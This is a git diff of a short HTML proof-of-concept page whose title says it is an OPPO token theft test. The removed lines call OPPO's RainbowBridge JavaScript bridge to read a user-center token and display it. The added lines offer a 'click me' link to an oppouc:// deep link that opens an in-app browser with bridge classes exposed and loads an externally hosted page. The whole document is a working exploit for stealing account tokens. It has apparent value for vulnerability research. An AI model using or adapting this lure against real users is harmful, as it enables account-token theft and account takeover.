@@ -1,20 +1,4 @@
 ﻿<html>
-<h1>heiheiheihei</h1>
-<script type="text/javascript" src='https://muc.oppomobile.com/html/libs/RainbowBridge.js?hash=96a4972a'></script>
-<script>
-RainbowBridge.callMethod('JSCommondMethod', 'getToken', {}, function(msg) {
-            if (msg.status.code == 0) {
-			alert(JSON.stringify(msg.data));
-                if (msg.data.token) {
-                    location.reload();
-                } else {
-                    RainbowBridge.callMethod('JSCommondMethod', 'onFinish', {}, function() {});
-                }
-            } else {
-			alert(1);
-                RainbowBridge.callMethod('JSCommondMethod', 'onFinish', {}, function() {});
-            }
-        });
-
-</script>
+<title>我的oppo token盗取测试</title>
+<a href="oppouc://usercenter.oppo.com/innerbrowser?classes=com.oppo.loanmarket.RechargeNativeMethod&com.oppo.loanmarket.LoanMarketNativeMethod&com.oppo.usercenter.JSCommondMethod&mIsUrlEncoded=true&min_version=523&url=https://oasfs.oppomobile.com/group1/M00/1F/79/rBAovV2oC2KAIwkZAAACxrFnS3062.html"><font size="10">点我</font></a>
 </html>
